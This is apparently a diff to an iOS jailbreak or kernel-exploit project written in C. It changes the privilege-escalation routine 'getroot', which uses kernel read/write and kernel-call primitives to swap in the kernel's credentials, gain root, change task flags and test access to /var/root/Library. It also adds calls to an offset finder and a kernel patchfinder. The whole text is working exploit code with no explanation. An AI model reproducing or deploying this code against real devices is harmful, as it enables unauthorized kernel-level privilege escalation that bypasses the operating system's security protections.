@@ -30,6 +30,7 @@ uint64_t proc_set_ucred = 0;
 uint64_t container_init = 0;
 uint64_t iogettargetand = 0;
 uint64_t empty_kdata    = 0;
+uint64_t mach_vm_alloc  = 0;
 
 void set_offsets(void) {
     kernel_slide = get_kernel_slide();
@@ -49,6 +50,8 @@ void set_offsets(void) {
     printf("kern_proc    : %016llx\n", kern_proc);
     printf("our_ucred    : %016llx\n", our_ucred);
     printf("kern_ucred   : %016llx\n", kern_ucred);
+    
+    offsetfinder64_kread();
 }
 
 /*---- proc ----*/
@@ -100,10 +103,7 @@ void getroot(void) {
             eary_kcall(proc_set_ucred, our_proc, kern_ucred, 0, 0, 0, 0, 0);
             
             usleep(5000);
-            kwrite32_kfd(off_p_uid + our_proc, 0);
-            kwrite32_kfd(off_p_gid + our_proc, 0);
-            kwrite32_kfd(off_p_ruid + our_proc, 0);
-            kwrite32_kfd(off_p_rgid + our_proc, 0);
+            setuid(0);
         }
     } else {
         if(isarm64e()) {
@@ -138,16 +138,18 @@ void getroot(void) {
         }
     }
     
-    uint32_t p_csflags = kread32_kfd(our_proc + off_p_csflags);
-    p_csflags |= 0x14000000;
-    kwrite32_kfd(our_proc + off_p_csflags, p_csflags);
-    
-    uint32_t t_flags = kread32_kfd(our_task + off_task_t_flags);
-    t_flags |= 0x00000400;
+    uint32_t t_flags_bak = kread32_kfd(our_task + off_task_t_flags);
+    uint32_t t_flags = t_flags_bak | 0x00000400;
     kwrite32_kfd(our_task + off_task_t_flags, t_flags);
     
     printf("getuid() : %d\n", getuid());
     printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
+    
+    kwrite32_kfd(our_task + off_task_t_flags, t_flags_bak);
+    if(isAvailable() >= 4 && !isarm64e()) {
+        eary_kcall(proc_set_ucred, our_proc, our_ucred, 0, 0, 0, 0, 0);
+        setuid(501);
+    }
     
 }
 
@@ -156,12 +158,11 @@ int meow(void) {
     
     set_offsets();
     
-    if(!isarm64e() || isAvailable() <= 7) {
-        offsetfinder64_kread();
-        init_kcall();
-    }
+    setup_client();
     
     getroot();
+    
+    Fugu15KPF();
     
     return 0;
 }
